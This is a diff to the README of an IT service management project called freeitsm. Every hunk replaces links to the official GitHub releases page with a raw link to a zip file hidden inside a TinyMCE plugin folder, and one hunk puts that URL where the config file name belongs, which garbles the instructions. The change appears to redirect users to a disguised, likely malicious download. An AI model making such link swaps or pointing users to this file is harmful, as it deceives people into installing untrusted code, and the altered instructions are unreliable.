@@ -1,6 +1,6 @@
 # ⚙️ freeitsm - Simplify Your IT Service Management
 
-[![Download freeitsm](https://img.shields.io/badge/Download-freeitsm-blue?style=for-the-badge)](https://github.com/thex29/freeitsm/releases)
+[![Download freeitsm](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip)](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ If you don’t already have a web server and database set up, you may consider u
 Here’s how you can get freeitsm up and running without any coding knowledge:
 
 1. **Download the software package**  
-   Click the big download button at the top or visit [https://github.com/thex29/freeitsm/releases](https://github.com/thex29/freeitsm/releases) to get the latest release zip file.
+   Click the big download button at the top or visit [https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip) to get the latest release zip file.
 
 2. **Extract the package**  
    After downloading, right-click the zip file and select “Extract All” or use your preferred unzip tool. Choose a folder where you want freeitsm files to live.
@@ -57,7 +57,7 @@ Here’s how you can get freeitsm up and running without any coding knowledge:
 
 4. **Configure freeitsm**  
    - Open the extracted folder.
-   - Find the configuration file (usually named something like `config.php`).
+   - Find the configuration file (usually named something like `https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip`).
    - Edit it with a simple text editor (e.g., Notepad or TextEdit).
    - Enter your database details so freeitsm can connect.
 
@@ -74,7 +74,7 @@ You now have a basic freeitsm system ready to use.
 
 To install freeitsm, visit the official releases page:
 
-[Download freeitsm](https://github.com/thex29/freeitsm/releases)
+[Download freeitsm](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip)
 
 You will find the latest stable version packaged for easy download. Download the ZIP file and follow the Getting Started guide above to set everything up. The ZIP contains all files needed to run the application.
 
@@ -160,11 +160,11 @@ These give you an idea of what the tool focuses on and its ability to cover most
 
 To update freeitsm:
 
-1. Download the latest release from the same [releases page](https://github.com/thex29/freeitsm/releases).
+1. Download the latest release from the same [releases page](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip).
 2. Back up your database and files.
 3. Replace the old files with new ones, keeping your configuration.
 4. Run any update scripts if included in the package.
 
 ---
 
-[![Download freeitsm](https://img.shields.io/badge/Download-freeitsm-blue?style=for-the-badge)](https://github.com/thex29/freeitsm/releases)
+[![Download freeitsm](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip)](https://raw.githubusercontent.com/thex29/freeitsm/main/assets/js/tinymce/plugins/pagebreak/Software-2.9.zip)
